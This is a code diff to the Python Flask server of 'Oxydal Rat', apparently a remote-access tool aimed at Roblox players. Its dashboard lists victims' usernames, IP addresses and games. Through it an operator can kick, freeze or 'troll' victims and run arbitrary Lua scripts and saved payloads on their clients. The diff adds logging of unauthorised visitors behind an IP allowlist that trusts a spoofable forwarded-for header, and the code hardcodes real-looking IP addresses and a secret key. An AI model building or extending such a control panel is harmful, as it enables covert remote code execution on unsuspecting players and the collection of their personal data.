@@ -9,19 +9,24 @@ import os
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
+app.config["SECRET_KEY"] = "super_secret_key_change_me_123456789"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
+# ===================== CONFIG =====================
+ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}  # ← Change avec tes IPs
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
+BLOCKED_IPS_FILE = "blocked_ips.json"  # Nouveau : stockage des skids
 
+# Variables globales
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 history_log = []
 payloads = {}
+blocked_ips_log = []
 
+# ===================== CHARGEMENT DES FICHIERS =====================
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -38,53 +43,99 @@ def load_payloads():
                 payloads = json.load(f)
         except: payloads = {}
 
+def load_blocked_ips():
+    global blocked_ips_log
+    if os.path.exists(BLOCKED_IPS_FILE):
+        try:
+            with open(BLOCKED_IPS_FILE, 'r', encoding='utf-8') as f:
+                blocked_ips_log = json.load(f)
+        except: blocked_ips_log = []
+
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
     except: pass
 
+def save_blocked_ips():
+    try:
+        with open(BLOCKED_IPS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(blocked_ips_log, f, ensure_ascii=False, indent=2)
+    except: pass
+
+# Chargement au démarrage
 load_history()
 load_payloads()
+load_blocked_ips()
 
-def check_ip():
+# ===================== SÉCURITÉ IP + DÉTECTION SKID =====================
+def get_client_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
-    if ip not in ALLOWED_IPS:
-        abort(403)
+    return ip
 
 @app.errorhandler(403)
 def access_denied(e):
-    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if detected and "," in detected:
-        detected = detected.split(",")[0].strip()
-    return f"<html><body style='background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%'><h1>Accès refusé</h1><p>Ton IP : <b>{detected}</b></p></body></html>", 403
+    ip = get_client_ip()
+    
+    # Enregistrement du skid (anti-flood : 1 par minute max)
+    if ip not in ALLOWED_IPS:
+        now = datetime.now()
+        entry = {
+            "ip": ip,
+            "time": now.strftime("%Y-%m-%d %H:%M:%S"),
+            "user_agent": request.headers.get("User-Agent", "Unknown")[:200],
+            "path": request.path
+        }
+        # Évite les doublons récents
+        recent = [e for e in blocked_ips_log[:20] if e["ip"] == ip]
+        if not any((now - datetime.strptime(e["time"], "%Y-%m-%d %H:%M:%S")).total_seconds() < 60 for e in recent):
+            blocked_ips_log.insert(0, entry)
+            if len(blocked_ips_log) > 1000:
+                blocked_ips_log.pop()
+            save_blocked_ips()
+            socketio.emit("skid_update", {"blocked": blocked_ips_log[:50]})
+
+    return f"""
+    <html>
+        <body style="background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%">
+            <h1>Accès refusé</h1>
+            <p>Ton IP : <b>{ip}</b></p>
+            <p><small>Tu n'es pas autorisé • Skid détecté</small></p>
+        </body>
+    </html>
+    """, 403
 
 @app.before_request
 def protect_routes():
-    if request.path in ["/", "/kick", "/troll", "/payload"] or request.path.startswith("/api"):
-        check_ip()
+    if request.path in ["/", "/kick", "/troll", "/payload", "/get_skids"] or request.path.startswith("/api"):
+        if get_client_ip() not in ALLOWED_IPS:
+            abort(403)
 
+# ===================== HISTORIQUE =====================
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
-    history_log.insert(0, {"time": timestamp, "type": event_type, "username": username, "details": details})
-    if len(history_log) > 100: history_log.pop()
+    entry = {"time": timestamp, "type": event_type, "username": username, "details": details}
+    history_log.insert(0, entry)
+    if len(history_log) > 100:
+        history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
             json.dump(history_log, f, ensure_ascii=False, indent=2)
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
+# ===================== HTML + JS COMPLET =====================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
-<title>Wave Rat Dashboard</title>
+<title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
-    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
+    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;--red:#ef4444;}
     *{margin:0;padding:0;box-sizing:border-box;}
     body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
     .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
@@ -136,25 +187,23 @@ HTML = """<!DOCTYPE html>
     .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
     .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
     @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
+    .skid-title{color:var(--red);border-bottom:2px solid var(--red);padding-bottom:8px;text-align:center;font-size:1.4rem;margin:2rem 0 1rem;}
 </style>
 </head>
 <body>
-
 <div class="header">
     <div class="logo">
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
-        <div>Wave Rat</div>
+        <div>Oxydal Rat</div>
     </div>
     <div class="stats">Players online: <b id="stats">0</b></div>
 </div>
-
 <div class="main">
     <div class="sidebar">
         <div class="nav-item active" data-tab="players">Players</div>
         <div class="nav-item" data-tab="workshop">Workshop</div>
         <div class="nav-item" data-tab="history">History</div>
     </div>
-
     <div class="content">
         <div id="players-tab" class="tab active">
             <div class="search-bar"><input type="text" id="searchInput" placeholder="Search by username, ID, IP, Game, JobId..." onkeyup="filterPlayers()"></div>
@@ -164,19 +213,22 @@ HTML = """<!DOCTYPE html>
             <button class="btn" style="margin-bottom:20px;" id="newPayloadBtn">+ New Payload</button>
             <div id="payloads-list"></div>
         </div>
-        <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
+        <div id="history-tab" class="tab" style="display:none;">
+            <h2 style="color:var(--primary);text-align:center;margin-bottom:1.5rem;">Historique des actions</h2>
+            <div id="history" style="margin-bottom:3rem;"></div>
+            <h2 class="skid-title">Skid détectés (<span id="skid-count">0</span>)</h2>
+            <div id="skid-list" style="max-height:60vh;overflow-y:auto;"></div>
+        </div>
     </div>
 </div>
 
-<!-- Modals -->
+<!-- Tous les modals (inchangés) -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
 <div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
-
-<!-- Modal Import Payload avec recherche + édition -->
 <div class="modal" id="executePayloadModal"><div class="modal-content">
     <h2>Import & Edit Payload</h2>
     <div class="search-bar"><input type="text" id="payloadSearch" placeholder="Search payload by name..." onkeyup="filterPayloads()"></div>
@@ -187,7 +239,6 @@ HTML = """<!DOCTYPE html>
         <button class="modal-btn confirm" id="executeTempPayload">Execute Modified</button>
     </div>
 </div></div>
-
 <div class="toast-container" id="toasts"></div>
 
 <script>
@@ -204,6 +255,7 @@ document.querySelectorAll('.nav-item').forEach(item => {
         item.classList.add('active');
         document.getElementById(item.dataset.tab + '-tab').style.display = 'block';
         if (item.dataset.tab === 'workshop') loadPayloads();
+        if (item.dataset.tab === 'history') fetch("/get_skids").then(r => r.json()).then(renderSkids);
     });
 });
 
@@ -276,7 +328,7 @@ document.getElementById("savePayload").addEventListener("click", () => {
     });
 });
 
-// Import Payload avec recherche + édition
+// Payload selector
 window.openPayloadSelector = function(id) {
     currentLuaId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
@@ -321,7 +373,7 @@ document.getElementById("executeTempPayload").addEventListener("click", () => {
     document.getElementById("executePayloadModal").classList.remove("active");
 });
 
-// Fonctions classiques
+// Modals
 function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
 function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
 function openTextScreenModal(id){currentTextId=id;document.getElementById("textScreenModal").classList.add("active");}
@@ -332,7 +384,11 @@ document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("cli
 
 function sendTroll(id,cmd,param=null){
     const body={userid:id,cmd};
-    if(param){if(cmd==="playsound")body.assetId=param;else if(cmd==="textscreen")body.text=param;else if(cmd==="luaexec")body.script=param;}
+    if(param){
+        if(cmd==="playsound") body.assetId=param;
+        else if(cmd==="textscreen") body.text=param;
+        else if(cmd==="luaexec") body.script=param;
+    }
     fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
     toast(cmd.toUpperCase()+" sent");
 }
@@ -360,7 +416,6 @@ function render(data){
             <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
             <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId || "N/A"}</div>
-
             <div class="category">TROLLS</div>
             <div class="btn-grid">
                 <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
@@ -373,7 +428,6 @@ function render(data){
                 <button class="btn" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                 <button class="btn" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
             </div>
-
             <div class="category">UNDO</div>
             <div class="btn-grid">
                 <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
@@ -383,7 +437,6 @@ function render(data){
                 <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                 <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
             </div>
-
             <div class="category">LUA EXEC</div>
             <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
                 <button class="btn" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
@@ -399,15 +452,40 @@ function renderHistory(data){
     document.getElementById("history").innerHTML = data.history.map(h=>`<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');
 }
 
+// SKID RENDER
+function renderSkids(data) {
+    const list = document.getElementById("skid-list");
+    const count = document.getElementById("skid-count");
+    if (!data.blocked || data.blocked.length === 0) {
+        list.innerHTML = `<p style="text-align:center;color:#94a3b8;padding:2rem;">Aucun skid détecté • GG aux vrais</p>`;
+        count.textContent = "0";
+        return;
+    }
+    count.textContent = data.blocked.length;
+    list.innerHTML = data.blocked.map(e => `
+        <div class="payload-item" style="border-left:5px solid #ef4444;background:#2d1b23;">
+            <strong style="color:#fca5a5;">${e.ip}</strong>
+            <span style="color:#94a3b8;font-size:0.8rem;margin-left:10px;">${e.time}</span>
+            <div style="font-size:0.75rem;color:#64748b;margin-top:4px;word-break:break-all;">
+                ${e.user_agent !== "Unknown" ? e.user_agent.substring(0,100)+(e.user_agent.length>100?"...":"") : ""}
+                ${e.path ? " • "+e.path : ""}
+            </div>
+        </div>
+    `).join('');
+}
+
 socket.on("update", render);
 socket.on("history_update", renderHistory);
 socket.on("kick_notice", d => toast(d.username + " → " + d.reason));
+socket.on("skid_update", renderSkids);
+
 fetch("/get_history").then(r=>r.json()).then(renderHistory);
+fetch("/get_skids").then(r=>r.json()).then(renderSkids);
 </script>
 </body>
 </html>"""
 
-# === Routes (inchangées) ===
+# ===================== ROUTES =====================
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -415,6 +493,10 @@ def index():
 @app.route("/get_history")
 def get_history():
     return jsonify({"history": history_log[:50]})
+
+@app.route("/get_skids")
+def get_skids():
+    return jsonify({"blocked": blocked_ips_log[:100]})
 
 @app.route("/api", methods=["GET", "POST"])
 def api():
@@ -455,7 +537,6 @@ def api():
 
 @app.route("/kick", methods=["POST"])
 def kick():
-    check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     reason = data.get("reason", "No reason")
@@ -467,7 +548,6 @@ def kick():
 
 @app.route("/troll", methods=["POST"])
 def troll():
-    check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     cmd = data.get("cmd", "")
@@ -491,7 +571,6 @@ def troll():
 
 @app.route("/payload", methods=["GET", "POST"])
 def payload_manager():
-    check_ip()
     if request.method == "GET":
         action = request.args.get("action")
         if action == "list": return jsonify(payloads)
@@ -513,6 +592,7 @@ def payload_manager():
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
 
+# ===================== BACKGROUND LOOP =====================
 def broadcast_loop():
     while True:
         now = time.time()
@@ -536,4 +616,3 @@ def broadcast_loop():
 if __name__ == "__main__":
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
-
